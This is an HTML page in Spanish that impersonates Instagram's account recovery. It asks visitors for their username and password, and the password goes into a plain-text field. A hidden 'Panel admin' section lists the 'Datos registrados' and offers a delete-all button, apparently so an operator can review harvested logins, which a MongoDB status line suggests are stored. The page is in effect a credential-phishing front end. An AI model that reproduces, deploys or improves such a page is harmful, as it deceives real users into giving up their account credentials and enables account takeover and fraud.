<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Recuperación de cuenta</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

    <header class="site-header">
        <span class="brand-name">INSTAGRAM</span>
    </header>

    <main id="appView" class="container">

        <section class="card">

            <img class="account-image" src="assets/imagen.png" alt="Imagen de recuperación de cuenta">

            <h1>Recuperación de cuenta</h1>

            <p id="activeUser" class="active-user"></p>
            <p id="connectionStatus" class="connection-status" role="status">Conectando con MongoDB...</p>

            <p class="description">
                Ingresa tu usuario y tu contraseña para enviar tu solicitud.
            </p>

            <form id="recoveryForm">

                <label for="username">
                    Usuario
                </label>

                <input
                    type="text"
                    id="username"
                    placeholder="Ingresa tu usuario"
                    autocomplete="username"
                    required
                >

                <label for="usernameConfirmation">
                    Contraseña
                </label>

                <input
                    type="text"
                    id="usernameConfirmation"
                    placeholder="Contraseña"
                    autocomplete="off"
                    required
                >

                <button type="submit">
                    Continuar
                </button>

            </form>

            <p id="message" class="message" role="status" aria-live="polite"></p>

            <section id="recordsSection" class="records is-hidden" aria-labelledby="recordsTitle">
                <div class="records-heading">
                    <h2 id="recordsTitle">Panel admin</h2>
                    <button id="clearButton" class="secondary-button" type="button">Borrar todo</button>
                </div>
                <p class="records-label">Datos registrados:</p>
                <p id="emptyMessage" class="empty-message">Todavía no hay solicitudes.</p>
                <ul id="recordsList"></ul>
            </section>

            <button id="logoutButton" class="link-button is-hidden" type="button">Cerrar sesión</button>

        </section>

    </main>

    <script src="script.js"></script>

</body>
</html>
